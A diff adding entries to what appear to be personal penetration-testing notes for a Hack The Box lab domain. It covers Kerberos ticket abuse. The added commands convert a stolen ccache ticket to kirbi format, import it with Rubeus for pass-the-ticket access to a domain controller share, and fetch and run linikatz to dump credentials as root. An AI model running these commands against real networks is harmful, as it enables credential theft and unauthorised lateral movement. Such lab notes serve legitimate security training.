@@ -614,3 +614,17 @@ $ proxychains evil-winrm -i dc01 -r inlanefreight.htb
 ```
 $ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 ```
+%% converting ccache file to kirbi for use in windows %%
+
+```
+C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+C:\htb> klist
+C:\htb>dir \\dc01\julio
+```
+%% importing converted ticket into windows session with Rubeus %%
+
+```
+$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+$ /opt/linikatz.sh
+```
+%% linikatz works like mimikatz as you have to be root to use it %%
